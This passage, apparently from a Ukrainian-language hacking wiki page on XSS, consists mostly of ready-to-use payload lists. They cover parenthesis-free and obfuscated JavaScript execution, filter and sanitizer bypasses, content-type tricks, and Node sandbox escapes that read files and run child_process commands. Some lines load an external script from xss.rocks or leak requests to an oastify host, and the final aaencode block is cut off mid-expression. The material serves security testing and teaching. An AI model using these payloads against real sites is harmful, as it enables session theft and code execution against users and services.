**JavaScript пробільні символи**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript всередині коментаря**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript без круглих дужок**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Виклик довільної функції (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Існує **JS code**, який використовує **неналежним чином дані, контрольовані зловмисником**, наприклад `location.href`. Зловмисник може зловживати цим, щоб виконати довільний JS code.\
**Через обсяг пояснення щодо** [**DOM vulnerabilities перенесено на цю сторінку**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Там ви знайдете детальне **пояснення того, що таке DOM vulnerabilities, як вони провокуються і як їх експлуатувати**.\
Також не забувайте, що **в кінці згаданої публікації** ви знайдете пояснення про [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Ескалація Self-XSS

### Cookie XSS

Якщо ви можете викликати XSS, відправивши payload всередині cookie, це зазвичай self-XSS. Однак, якщо ви знайдете **вразливий субдомен до XSS**, ви можете зловживати цим XSS, щоб інжектнути cookie на весь домен і таким чином спровокувати cookie XSS на основному домені або інших субдоменах (тих, вразливих до cookie XSS). Для цього можна використати cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Чудовий приклад зловживання цією технікою можна знайти в [**цій публікації блогу**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Надсилання вашої сесії адміністратору

Можливо, користувач може поділитися своїм профілем з адміністратором, і якщо self XSS знаходиться в профілі користувача, і адміністратор його відкриє, це спровокує вразливість.

### Session Mirroring

Якщо ви знайдете self XSS і веб-сторінка має **session mirroring for administrators** — наприклад, дозволяє клієнтам просити допомогу, і щоб адміністратор допоміг вам, він бачитиме те, що бачите ви у своїй сесії, але зі своєї сесії.

Ви можете змусити **адміністратора спровокувати ваш self XSS** і вкрасти його cookies/session.

## Інші обхідні методи

### Обхід санітизації через WASM linear-memory template overwrite

Коли веб-додаток використовує Emscripten/WASM, константні рядки (наприклад, HTML format stubs) розміщуються в записуваній лінійній пам'яті. Єдиний in‑WASM overflow (наприклад, unchecked memcpy в шляху редагування) може пошкодити суміжні структури і перенаправити записи до цих констант. Перезапис шаблону, такого як "<article><p>%.*s</p></article>" на "<img src=1 onerror=%.*s>", перетворює відфільтрований ввід у значення JavaScript handler і дає миттєвий DOM XSS при рендері.

Перегляньте спеціальну сторінку з робочим процесом експлуатації, DevTools memory helpers і заходами захисту:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Нормалізований Unicode

Ви можете перевірити, чи **reflected values** нормалізуються як **unicode normalized** на сервері (або на клієнті) та зловживати цією функціональністю для обходу захистів. [**Див. приклад тут**](../unicode-injection/index.html#xss-cross-site-scripting).

### Обхід прапорця PHP FILTER_VALIDATE_EMAIL
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Через **RoR mass assignment** у HTML вставляються лапки, і обмеження лапок обходиться, після чого всередині тега можна додати додаткові поля (onfocus).\
Приклад форми ([from this report](https://hackerone.com/reports/709336)), якщо ви відправите payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Пара "Key","Value" буде відображена так:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Тоді буде вставлено атрибут onfocus і відбудеться XSS.

### Спеціальні комбінації
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Якщо ви виявите, що можете **інжектити заголовки у 302 Redirect response**, можна спробувати **змусити браузер виконати довільний JavaScript**. Це **не тривіально**, оскільки сучасні браузери не інтерпретують тіло HTTP-відповіді, якщо статус-код відповіді — 302, тож просто XSS-пейлоуд буде марним.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Лише літери, цифри та крапки

Якщо ви можете вказати **callback**, який javascript збирається **виконати**, обмежений лише цими символами. [**Прочитайте цей розділ цієї публікації**](#javascript-function), щоб дізнатися, як зловживати цією поведінкою.

### Дійсні Content-Type для `<script>` для XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) If you try to load a script with a **content-type** such as `application/octet-stream`, Chrome will throw following error:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

The only **Content-Type**s that will support Chrome to run a **loaded script** are the ones inside the const **`kSupportedJavascriptTypes`** from [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Script Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Отже, які типи можна вказати для завантаження script?
```html
<script type="???"></script>
```
Відповідь:

- **module** (за замовчуванням, нічого пояснювати)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles — це функція, яка дозволяє упакувати набір даних (HTML, CSS, JS…) разом у файл **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Дозволяє покращити синтаксис import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Цю поведінку було використано в [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) для перенаправлення бібліотеки на eval; зловживання цим може спричинити XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Ця функція в основному призначена для вирішення деяких проблем, спричинених попереднім рендерингом. Вона працює так:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Веб Content-Types для XSS

(З [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Наступні типи вмісту можуть виконувати XSS у всіх браузерах:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? не в списку, але, здається, я бачив це на CTF)
- application/rss+xml (вимкнено)
- application/atom+xml (вимкнено)

В інших браузерах інші **`Content-Types`** можуть використовуватися для виконання довільного JS, див.: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Тип вмісту

Якщо сторінка повертає text/xml content-type, можна вказати простір імен і виконати довільний JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Спеціальні шаблони заміни

Коли використовується щось на кшталт **`"some {{template}} data".replace("{{template}}", <user_input>)`**, нападник може використати [**спеціальні заміни рядків**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) щоб спробувати обійти деякі механізми захисту: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Наприклад, у [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) це було використано, щоб екранувати JSON рядок всередині скрипту і виконати довільний код.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Якщо у вас є лише обмежений набір символів для використання, перегляньте ці інші дієві рішення для проблем XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Якщо **everything is undefined** перед виконанням недовіреного коду (як у [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)), можна згенерувати корисні об’єкти "з нічого", щоб зловживати виконанням довільного недовіреного коду:

- Використовуючи import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Доступ до `require` опосередковано

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) модулі обгортаються Node.js у функцію, ось так:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Отже, якщо з цього модуля ми можемо **викликати іншу функцію**, можливо використати `arguments.callee.caller.arguments[1]` з тієї функції, щоб отримати доступ до **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Подібно до попереднього прикладу, можна **use error handlers**, щоб отримати доступ до **wrapper** модуля і отримати функцію **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Different obfuscations in one page:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Більш складний JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
